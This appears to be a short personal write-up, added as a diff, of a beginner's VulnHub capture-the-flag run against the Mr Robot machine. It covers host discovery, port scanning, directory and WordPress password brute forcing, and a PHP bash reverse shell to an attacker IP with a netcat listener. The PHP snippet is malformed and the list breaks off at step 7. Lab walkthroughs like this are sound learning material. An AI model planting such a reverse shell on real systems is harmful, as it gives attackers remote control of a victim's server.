@@ -1,0 +1,16 @@
+So Its 01/01/2026 marking this new year I have also taken my first step towards CTF via vulnhub with Mr Robot machine
+
+1) Discovery using netdiscover -r 0x.0x.0x.0x/0x
+2) Port scanning using nmap -sS 10.15.1.111
+we found there is a web server open, So we'll try to put on web browser
+3) Directory bruteforce
+Here we can see /robots.txt and /wp-login and also a wordlist
+4) with the found wordlist bruteforce the password
+5) After entering to the wordpress re-configure the code to open a shell to attacker machines ip address in 443 port
+  <?php>
+    exec('/bin/bash -c "bash -i /dev/tcp/0x.0x.0x.0x/443 0>&1"');
+  <?>
+
+6) In attacker machine listen on the port nc -lvp 443
+Reverse shell has been established
+7) 
